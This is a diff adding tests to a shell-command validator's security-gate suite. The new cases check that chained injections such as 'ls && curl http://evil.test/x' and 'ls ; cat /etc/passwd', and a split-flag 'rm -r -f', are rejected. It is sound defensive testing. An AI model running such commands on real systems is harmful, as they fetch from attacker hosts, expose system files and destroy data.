@@ -107,6 +107,35 @@ describe('validateBashRun — security gates (0.7.9)', () => {
     expect(r.ok).toBe(true);
   });
 
+  it('allowlisted prefix + && 체이닝 주입 거부 (operator gate)', async () => {
+    ENABLED_LS();
+    const r = await validateBashRun({
+      command: 'ls && curl http://evil.test/x',
+    });
+    expect(r.ok).toBe(false);
+    if (!r.ok) expect(r.reason).toBe('shell-operator-not-allowlisted');
+  });
+
+  it('allowlisted prefix + ; 체이닝 거부 (operator gate)', async () => {
+    ENABLED_LS();
+    const r = await validateBashRun({ command: 'ls ; cat /etc/passwd' });
+    expect(r.ok).toBe(false);
+    if (!r.ok) expect(r.reason).toBe('shell-operator-not-allowlisted');
+  });
+
+  it('blocklist — rm 의 분리된 -r -f 플래그도 차단', async () => {
+    vi.spyOn(bashStore, 'isBashEnabled').mockResolvedValue(true);
+    vi.spyOn(bashStore, 'getBashAllowlist').mockResolvedValue(['rm']);
+    vi.spyOn(session, 'getSession').mockResolvedValue({
+      lastFolderPath: '/Users/test/workspace',
+      lastActivePath: null,
+      openTabPaths: [],
+    });
+    const r = await validateBashRun({ command: 'rm -r -f /tmp/x' });
+    expect(r.ok).toBe(false);
+    if (!r.ok) expect(r.reason).toContain('blocklist');
+  });
+
   it('allowlist 빈 → allowlist-empty 거부 (deny-by-default)', async () => {
     vi.spyOn(bashStore, 'isBashEnabled').mockResolvedValue(true);
     vi.spyOn(bashStore, 'getBashAllowlist').mockResolvedValue([]);
